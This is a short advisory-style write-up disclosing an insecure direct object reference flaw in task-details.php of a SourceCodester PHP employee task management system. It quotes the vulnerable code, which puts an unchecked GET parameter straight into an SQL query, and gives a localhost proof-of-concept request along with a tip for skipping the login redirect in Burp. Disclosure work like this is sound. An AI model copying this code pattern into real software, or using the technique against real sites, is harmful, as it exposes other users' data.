# SOURCECODESTER / Employee Task Management System - IDOR task-details.php

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)

## Vendor Homepage:
> https://www.sourcecodester.com/php/17217/employee-management-system-php-and-mysql-free-download.html

## Affected Component
> /task-details.php

## Code
```php
$task_id = $_GET['task_id'];



if(isset($_POST['update_task_info'])){
    $obj_admin->update_task_info($_POST,$task_id, $user_role);
}

$page_name="Edit Task";
include("include/sidebar.php");

$sql = "SELECT a.*, b.fullname 
FROM task_info a
LEFT JOIN tbl_admin b ON(a.t_user_id = b.user_id)
WHERE task_id='$task_id'";
$info = $obj_admin->manage_all_info($sql);
$row = $info->fetch(PDO::FETCH_ASSOC);
```

## Proof of Concept
**HTTP Request Example**
>task_id parameter is vulnerable to IDOR
>Note: Attacker can use idor without authentication in burp by not following the redirection
``` http request
GET /task-details.php?task_id=21 HTTP/1.1
Host: 127.0.0.1
Research-By: NoChizPlz
```

## Screenshot
![img.png](IDOR%20-%20task-details%2Fimg.png)


